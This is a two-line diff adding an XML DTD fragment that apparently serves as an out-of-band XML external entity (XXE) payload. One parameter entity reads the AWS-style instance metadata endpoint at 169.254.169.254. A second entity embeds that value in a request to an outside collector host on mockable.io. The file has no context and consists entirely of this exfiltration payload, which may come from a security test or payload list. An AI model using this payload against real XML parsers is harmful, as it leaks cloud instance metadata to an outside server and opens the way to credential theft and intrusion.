@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "https://169.254.169.254/latest/meta-data/ami-id">
+<!ENTITY % two "<!ENTITY four SYSTEM 'http://demo9711588.mockable.io/?test=%three;'>">
